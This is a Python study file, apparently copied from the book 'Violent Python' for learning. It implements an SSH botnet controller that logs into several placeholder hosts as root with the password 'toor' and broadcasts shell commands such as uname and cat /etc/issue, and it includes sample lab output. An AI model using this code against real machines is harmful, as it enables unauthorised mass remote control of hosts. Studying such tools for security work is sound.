'''
This file is part of examples shown in a book
"Violent Python Cookbook for Hackers, Forensic Analysts, Penetration Testers and Security Engineers"
Most of the code is copied as is, or with minor changes to make naming easier to understand and some
comments may have been added where i explain to myself how everything works ( the code is not just blindly copied ).
The purpose of these files is for me to understand how the code works and become better at the security field.
------------
Antti Ruhala, Tampere University of Technology
------------
'''

'''
Third party python module Pexpect is used to interact with SSH
http://pexpect. sourceforge.net
'''
'''
this spesific code requires that you know the usernames and passwords
before hand.

PxsshBruteforce does password "cracking"
'''

import optparse
import pxssh

class Client:
    def __init__(self, host, user, password):
        self.host = host
        self.user = user
        self.password = password
        self.session = self.connect()

    def connect(self):
        try:
            s = pxssh.pxssh()
            s.login(self.host, self.user, self.password)
            return s
        except Exception as e:
            print(e)
            print('[-] Error connecting')

    def send_command(self, cmd):
        self.session.sendline(cmd)  # run a command
        self.session.prompt()       # match the prompt
        return self.session.before  # everything before prompt

def botnetCommand(command):
    for client in botNet:
        output = client.send_command(command)
        print('[*] Output from ' + client.host)
        print('[+] ' + output + '\n')

def addClient(host, user, password):
    client = Client(host, user, password)
    botNet.append(client)
botNet = [] # global list
addClient('xx.yy.zz.kkk', 'root', 'toor')
addClient('xx.yy.zz.abc', 'root', 'toor')
addClient('xx.yy.zz.bbq', 'root', 'toor')
botnetCommand('uname -v')       # name and info about current kernel
botnetCommand('cat /etc/issue') # message/system identification
                                # that shows before login prompt

'''
Example run:

attacker:∼# python BotnetWithBotArray.py 
[*] Output from 10.10.10.110 
[+] uname -v #1 SMP Fri Feb 17 10:34:20 EST 2012 
[*] Output from 10.10.10.120 
[+] uname -v #1 SMP Fri Feb 17 10:34:20 EST 2012 
[*] Output from 10.10.10.130 
[+] uname -v #1 SMP Fri Feb 17 10:34:20 EST 2012 
[*] Output from 10.10.10.110 
[+] cat /etc/issue BackTrack 5 R2 - Code Name Revolution 64 bit \n \l 
[*] Output from 10.10.10.120 
[+] cat /etc/issue BackTrack 5 R2 - Code Name Revolution 64 bit \n \l 
[*] Output from 10.10.10.130 
[+] cat /etc/issue BackTrack 5 R2 - Code Name Revolution 64 bit \n \l

'''